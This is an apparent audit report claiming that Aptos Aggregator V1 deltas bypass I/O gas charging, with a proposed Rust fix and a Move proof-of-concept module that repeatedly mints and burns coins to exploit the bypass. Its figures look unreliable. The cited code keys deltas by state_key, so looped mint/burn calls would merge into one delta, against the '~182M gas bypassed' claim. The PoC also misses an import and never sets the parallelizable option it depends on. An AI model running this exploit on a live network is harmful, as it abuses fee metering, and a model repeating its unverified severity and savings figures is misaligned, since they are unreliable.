# Audit Report

## Title
Aggregator V1 Delta Operations Bypass I/O Gas Charging Leading to Subsidized State Modifications

## Summary
Aggregator V1 delta operations (add/subtract) are not charged I/O gas when materialized into storage writes, allowing transactions to perform state modifications while paying only computational gas but not the I/O costs. This breaks the gas metering invariant that all storage operations must pay appropriate I/O fees. [1](#0-0) 

## Finding Description

The vulnerability exists in the gas charging mechanism for Aggregator V1 operations. When a transaction modifies an aggregator using `add()` or `sub()` operations, the system creates a `DeltaOp` stored in the `aggregator_v1_delta_set` within the `VMChangeSet`. [2](#0-1) 

During transaction execution, the `charge_change_set()` function is called to charge I/O gas for write operations. However, this function only iterates through items returned by `write_set_size_iter()`, which includes `resource_write_set` and `aggregator_v1_write_set`, but **excludes** `aggregator_v1_delta_set`: [3](#0-2) [4](#0-3) 

The aggregator deltas are materialized into concrete writes **after** gas charging occurs, during sequential execution: [5](#0-4) 

This means the materialized writes are committed to storage without having paid the I/O gas costs. The I/O gas for a write operation includes:
- Per-operation cost: ~89,568 internal gas units
- Per-byte cost: ~89 internal gas units per byte (for keys and values) [6](#0-5) 

For a typical aggregator value (u128 = 16 bytes), the missing I/O charge is approximately **~90,992 internal gas units** per delta operation, compared to the ~1,102 gas units charged for the native aggregator operation: [7](#0-6) 

**Exploitation Path:**
1. Attacker creates a coin with `monitor_supply = true` and `parallelizable = true`, which creates an aggregator for supply tracking: [8](#0-7) 

2. Attacker repeatedly mints and burns coins, each operation modifying the supply aggregator: [9](#0-8) [10](#0-9) 

3. Each modification creates a delta that bypasses ~90,992 gas units of I/O charging
4. The deltas are materialized into storage writes without retroactive charging

## Impact Explanation

**Severity: Medium** - This qualifies as "State inconsistencies requiring intervention" under the Medium severity category ($10,000 bounty).

**Broken Invariant:** "Resource Limits: All operations must respect gas, storage, and computational limits" - Specifically, I/O gas limits are partially bypassed.

**Impact:**
- **Subsidized State Bloat**: Attackers with coin mint capabilities can create storage writes while paying only ~1.2% of the appropriate I/O cost
- **Gas Metering Violation**: Breaks the fundamental principle that all state modifications must pay proportional I/O costs
- **Economic Imbalance**: Creates an unfair advantage for operations using Aggregator V1 versus direct storage writes
- **Network-Wide Effect**: If exploited at scale, could lead to storage growth without corresponding fee collection

The vulnerability does NOT cause:
- Direct fund theft or minting
- Consensus safety violations
- Total network unavailability

However, it enables **limited state manipulation** where certain privileged operations (those with aggregator access) can modify state at significantly reduced cost.

## Likelihood Explanation

**Likelihood: Medium**

**Requirements:**
- Attacker must have `MintCapability` and `BurnCapability` for a coin (obtainable by creating a new coin)
- The coin must have supply tracking enabled with parallelizable aggregators
- Attacker must execute many mint/burn operations to accumulate meaningful gas savings

**Limitations:**
- Only framework-accessible aggregators are affected (primarily coin supply tracking)
- Regular users cannot directly create or modify aggregators
- Attacker still pays transaction fees and execution gas (~1,102 per operation)
- Savings are partial (I/O only, not total gas)

The TODO comment indicates developers are aware of this incomplete implementation, but it remains unfixed in production code.

## Recommendation

Add I/O gas charging for aggregator deltas before they are materialized. Modify the `charge_change_set()` function to iterate through both `aggregator_v1_delta_set` and `aggregator_v1_write_set`:

```rust
fn charge_change_set(
    &self,
    change_set: &mut impl ChangeSetInterface,
    gas_meter: &mut impl AptosGasMeter,
    txn_data: &TransactionMetadata,
    resolver: &impl AptosMoveResolver,
    module_storage: &impl AptosModuleStorage,
) -> Result<GasQuantity<Octa>, VMStatus> {
    gas_meter.charge_io_gas_for_transaction(txn_data.transaction_size())?;
    
    for event in change_set.events_iter() {
        gas_meter.charge_io_gas_for_event(event)?;
    }
    
    for (key, op_size) in change_set.write_set_size_iter() {
        gas_meter.charge_io_gas_for_write(key, &op_size)?;
    }
    
    // ADD: Charge for aggregator v1 deltas
    for (key, delta_op) in change_set.aggregator_v1_delta_set() {
        // Estimate the write size based on u128 value (16 bytes)
        let op_size = WriteOpSize::Modification { write_len: 16 };
        gas_meter.charge_io_gas_for_write(key, &op_size)?;
    }
    
    let mut storage_refund = gas_meter.process_storage_fee_for_all(
        change_set,
        txn_data.transaction_size,
        txn_data.gas_unit_price,
        resolver.as_executor_view(),
        module_storage,
    )?;
    
    if !self.features().is_storage_deletion_refund_enabled() {
        storage_refund = 0.into();
    }
    
    Ok(storage_refund)
}
```

Alternatively, extend the `ChangeSetInterface::write_set_size_iter()` implementation to include aggregator deltas with estimated sizes.

## Proof of Concept

```move
module test_addr::aggregator_gas_bypass {
    use aptos_framework::coin::{Self, MintCapability, BurnCapability};
    use aptos_framework::aggregator_factory;
    use std::string;
    
    struct TestCoin {}
    
    struct Caps has key {
        mint_cap: MintCapability<TestCoin>,
        burn_cap: BurnCapability<TestCoin>,
    }
    
    // Initialize coin with parallelizable supply tracking
    public entry fun setup(account: &signer) {
        let (burn_cap, freeze_cap, mint_cap) = coin::initialize<TestCoin>(
            account,
            string::utf8(b"Test Coin"),
            string::utf8(b"TEST"),
            8,
            true,  // monitor_supply
        );
        
        coin::destroy_freeze_cap(freeze_cap);
        move_to(account, Caps { mint_cap, burn_cap });
    }
    
    // Exploit: Repeatedly mint and burn to create aggregator deltas
    // without paying full I/O gas
    public entry fun exploit(account: &signer, iterations: u64) acquires Caps {
        let caps = borrow_global<Caps>(signer::address_of(account));
        let i = 0;
        
        // Each iteration creates 2 aggregator deltas (mint + burn)
        // Bypassing ~182,000 gas units of I/O charging per iteration
        while (i < iterations) {
            let coins = coin::mint(100, &caps.mint_cap);
            coin::burn(coins, &caps.burn_cap);
            i = i + 1;
        };
        
        // With 1000 iterations: ~182M gas units bypassed
        // At 100 gas units per octa, this is ~1.82M octa saved
    }
}
```

**Test execution**: Deploy this module, call `setup()` to initialize the coin, then call `exploit()` with high iteration count. Monitor gas consumption - it will be significantly lower than expected for the number of storage writes performed.

## Notes

The vulnerability is explicitly marked with a TODO comment in the codebase, indicating the development team is aware that aggregator writes need charging implementation. However, this remains unaddressed in the production code, creating a tangible gas bypass vulnerability for operations using Aggregator V1.

### Citations

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1124-1126)
```rust
        for (key, op_size) in change_set.write_set_size_iter() {
            gas_meter.charge_io_gas_for_write(key, &op_size)?;
        }
```

**File:** aptos-move/aptos-vm/src/aptos_vm.rs (L1158-1158)
```rust
        // TODO[agg_v1](fix): Charge for aggregator writes
```

**File:** aptos-move/aptos-vm/src/move_vm_ext/session/mod.rs (L493-494)
```rust
                AggregatorChangeV1::Merge(delta_op) => {
                    aggregator_v1_delta_set.insert(state_key, delta_op);
```

**File:** aptos-move/aptos-vm-types/src/change_set.rs (L367-398)
```rust
    pub fn try_materialize_aggregator_v1_delta_set(
        &mut self,
        resolver: &impl AggregatorV1Resolver,
    ) -> VMResult<()> {
        let into_write =
            |(state_key, delta): (StateKey, DeltaOp)| -> VMResult<(StateKey, WriteOp)> {
                // Materialization is needed when committing a transaction, so
                // we need precise mode to compute the true value of an
                // aggregator.
                let write = resolver
                    .try_convert_aggregator_v1_delta_into_write_op(&state_key, &delta)
                    .map_err(|e| {
                        // We need to set abort location for Aggregator V1 to ensure correct VMStatus can
                        // be constructed.
                        const AGGREGATOR_V1_ADDRESS: AccountAddress = CORE_CODE_ADDRESS;
                        const AGGREGATOR_V1_MODULE_NAME: &IdentStr = ident_str!("aggregator");
                        e.finish(Location::Module(ModuleId::new(
                            AGGREGATOR_V1_ADDRESS,
                            AGGREGATOR_V1_MODULE_NAME.into(),
                        )))
                    })?;
                Ok((state_key, write))
            };

        let aggregator_v1_delta_set = std::mem::take(&mut self.aggregator_v1_delta_set);
        let materialized_aggregator_delta_set = aggregator_v1_delta_set
            .into_iter()
            .map(into_write)
            .collect::<VMResult<BTreeMap<StateKey, WriteOp>>>()?;
        self.aggregator_v1_write_set
            .extend(materialized_aggregator_delta_set);
        Ok(())
```

**File:** aptos-move/aptos-vm-types/src/change_set.rs (L862-870)
```rust
    fn write_set_size_iter(&self) -> impl Iterator<Item = (&StateKey, WriteOpSize)> {
        self.resource_write_set()
            .iter()
            .map(|(k, v)| (k, v.materialized_size()))
            .chain(
                self.aggregator_v1_write_set()
                    .iter()
                    .map(|(k, v)| (k, v.write_op_size())),
            )
```

**File:** aptos-move/aptos-gas-schedule/src/gas_schedule/transaction.rs (L108-126)
```rust
            storage_io_per_state_slot_write: InternalGasPerArg,
            { 0..=9 => "write_data.per_op", 10.. => "storage_io_per_state_slot_write"},
            // The cost of writing down the upper level new JMT nodes are shared between transactions
            // because we write down the JMT in batches, however the bottom levels will be specific
            // to each transactions assuming they don't touch exactly the same leaves. It's fair to
            // target roughly 1-2 full internal JMT nodes (about 0.5-1KB in total) worth of writes
            // for each write op.
            89_568,
        ],
        [
            legacy_write_data_per_new_item: InternalGasPerArg,
            {0..=9 => "write_data.new_item"},
            1_280_000,
        ],
        [
            storage_io_per_state_byte_write: InternalGasPerByte,
            { 0..=9 => "write_data.per_byte_in_key", 10.. => "storage_io_per_state_byte_write"},
            89,
        ],
```

**File:** aptos-move/framework/src/natives/aggregator_natives/aggregator.rs (L34-34)
```rust
    context.charge(AGGREGATOR_ADD_BASE)?;
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L1086-1088)
```text
            supply: if (monitor_supply) {
                option::some(optional_aggregator::new(parallelizable))
            } else {
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L1220-1220)
```text
            optional_aggregator::add(supply, (amount as u128));
```

**File:** aptos-move/framework/aptos-framework/sources/coin.move (L1238-1238)
```text
                optional_aggregator::sub(supply, (amount as u128));
```
